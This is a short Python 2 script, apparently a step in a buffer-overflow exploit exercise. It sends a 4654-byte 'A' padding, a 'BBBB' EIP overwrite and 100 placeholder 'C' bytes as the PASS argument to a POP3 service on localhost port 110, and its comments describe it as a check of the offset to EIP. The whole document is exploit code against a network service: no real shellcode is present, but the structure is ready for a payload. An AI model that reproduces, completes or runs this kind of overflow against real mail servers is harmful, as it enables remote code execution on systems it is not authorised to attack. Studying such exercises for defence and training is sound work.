#!/usr/bin/python 
import struct
import socket
 

 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 

# Here we are just verifying that calculated our distance to EIP properly.
# If this script works than EIP should be overwritten with 42424242
# and ESP should be filled with Cs (43s) 
 
 
 
distance_to_eip = '\x41' * 4654

eip_overwrite = "BBBB"

shellcode = "C" * 100

buffer = distance_to_eip + eip_overwrite + shellcode



try:
    print "\nSending the exploit..."
    s.connect(('127.0.0.1',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!"